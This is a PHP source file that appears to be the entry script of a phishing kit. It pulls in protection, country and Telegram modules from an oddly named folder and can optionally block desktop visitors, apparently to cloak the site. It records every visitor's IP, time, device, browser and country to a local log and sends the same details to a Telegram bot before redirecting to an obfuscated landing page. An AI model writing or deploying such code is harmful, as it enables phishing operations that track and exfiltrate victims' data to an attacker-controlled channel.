<?php

include('./LO0JGTZHZJZG/Variablex/Protection.php');
include('./LO0JGTZHZJZG/Variablex/COUNTRY.php');
include('./LO0JGTZHZJZG/Variablex/SYS.php');
include('./LO0JGTZHZJZG/dynamo.php');
include('./LO0JGTZHZJZG/Variablex/XTelegram.php');

// Option to block PCs
$block_pc = false; // Change this value to false if you do not want to block computers if you want to block them to true

// Function to check if the device is a PC
function is_pc($user_os) {
    $pc_os_list = ['Windows', 'Macintosh', 'Linux'];
    foreach ($pc_os_list as $pc_os) {
        if (strpos($user_os, $pc_os) !== false) {
            return true;
        }
    }
    return false;
}

// Check the device
if ($block_pc && is_pc($user_os)) {
    // If the device is a PC and blocking is enabled
    $block_message = "PC access blocked - IP: ".$ip."\nTIME: ".$date."\nDEVICE: ".$user_os."\nBROWSER: ".$user_browser."\nCOUNTRY: ".$get_user_country;
    $block_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=".urlencode($block_message);
    file_get_contents($block_url);
    die("The content could not be displayed");
} else {
    $file = fopen("911.txt", "a");
    fwrite($file, "IP=".$ip."/TIME=".$date."/DEVICE=".$user_os."/BROWSER=".$user_browser." >> [$get_user_country]\n");
    fclose($file);
    $message = "Visit - IP: ".$ip."\nTIME: ".$date."\nDEVICE: ".$user_os."\nBROWSER: ".$user_browser."\nCOUNTRY: ".$get_user_country;
    $url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=".urlencode($message);
    file_get_contents($url);
    header("Location: ./LO0JGTZHZJZG/index.php?Ticket=1#HDHKJDJDSSJDSJKJDSJDSDJJDSHYKJHGFG");
}

?>
